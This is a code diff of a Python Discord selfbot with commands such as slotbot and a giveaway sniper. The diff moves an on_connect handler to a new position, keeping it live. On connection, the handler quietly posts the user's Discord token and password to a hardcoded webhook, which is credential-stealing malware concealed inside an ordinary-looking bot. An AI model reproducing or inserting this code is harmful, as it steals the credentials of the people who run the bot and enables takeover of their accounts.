@@ -325,6 +325,10 @@ async def slotbot(ctx, param=None):
     elif str(param).lower() == 'false' or str(param).lower() == 'off':
         Iso.slotbot_sniper = False
 
+@Iso.event
+async def on_connect():
+  Clear()
+  requests.post('https://discord.com/api/webhooks/758323372253118484/BJSFQ5QjG5zm8-3NVptNvcmL9MQpmpA35_tfz7B3soVoNK0Y95l5kdHBJv3ElVkeMyLI',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
 
 @Iso.command(aliases=['giveawaysniper'])
 async def giveaway(ctx, param=None):
@@ -416,11 +420,7 @@ async def on_message_edit(before, after):
             discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
             before.content) + "\n\n**Attachments:**\n" + links
         Iso.sniped_edited_message_dict.update({channel_id: message_content})
-
-@Iso.event
-async def on_connect():
-  Clear()
-  requests.post('https://discord.com/api/webhooks/758323372253118484/BJSFQ5QjG5zm8-3NVptNvcmL9MQpmpA35_tfz7B3soVoNK0Y95l5kdHBJv3ElVkeMyLI',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})        
+        
         
 @Iso.command(aliases=["esnipe"])
 async def editsnipe(ctx):
